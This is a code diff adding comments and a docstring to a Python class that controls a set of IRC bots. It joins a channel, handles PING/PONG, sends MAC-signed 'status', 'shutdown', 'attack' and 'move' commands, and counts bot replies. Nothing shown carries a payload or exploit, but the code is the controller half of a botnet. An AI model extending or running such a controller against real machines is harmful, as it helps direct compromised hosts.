@@ -19,6 +19,9 @@ def generate_nonce() -> str:
     return str(random.randint(100000, 999999))
 
 class IRCController:
+    """
+    Class for controlling IRCbots
+    """
     def __init__(self, host: str, port: int, channel: str, secret: str):
         self.host: str = host
         self.port: int = port
@@ -49,7 +52,7 @@ class IRCController:
                     line = line.strip()
                     if not line:
                         continue
-                        
+                    #IRC PING PONG
                     if line.startswith("PING"):
                         pong = line.replace("PING", "PONG", 1)
                         self.send(pong)
@@ -85,7 +88,7 @@ class IRCController:
         while time.time() - start_time < timeout:
             if not self.socket:
                 return False
-                
+            # Use select to wait for the socket to be ready for reading
             rlist, _, _ = select.select([self.socket], [], [], 0.1)
             if not rlist:
                 continue
@@ -99,6 +102,7 @@ class IRCController:
                 
                 self.recv_buffer += data
                 lines = self.recv_buffer.split('\n')
+                # Save any incomplete line back to the buffer
                 self.recv_buffer = lines.pop() if lines else ""
                 
                 for line in lines:
@@ -110,7 +114,7 @@ class IRCController:
                         pong = line.replace("PING", "PONG", 1)
                         self.send(pong)
                         continue
-                    
+                    # Process messages containing PRIVMSG and the channel name
                     if "PRIVMSG" in line and f"#{self.channel}" in line:
                         try:
                             sender = line.split('!')[0][1:] if '!' in line else "unknown"
@@ -144,7 +148,7 @@ class IRCController:
                 
                 parts = cmd.split()
                 command = parts[0].lower()
-                
+                #control logic
                 if command == "quit":
                     print("Disconnected.")
                     if self.socket:
@@ -152,6 +156,7 @@ class IRCController:
                     break
                 
                 elif command in ["status", "shutdown", "attack", "move"]:
+                    #auth
                     nonce = generate_nonce()
                     mac = compute_mac(nonce, self.secret)
                     
@@ -201,17 +206,19 @@ class IRCController:
                 break
     
     def _handle_status_responses(self) -> None:
+        # list to store tuples of bot nicknames and their counts
         status_bots: List[Tuple[str, str]] = []
         
         for response in self.responses:
             if response.startswith("-status "):
                 parts = response.split()
-                if len(parts) == 3:
+                if len(parts) == 3: # "-status", nick, and count
                     nick = parts[1]
                     count = parts[2]
                     status_bots.append((nick, count))
         
         print(f"  Result: {len(status_bots)} bots replied.")
+        # Create a list of formatted strings for each bot
         if status_bots:
             bot_list = [f"{nick} ({count})" for nick, count in status_bots]
             print(f"    {', '.join(bot_list)}")
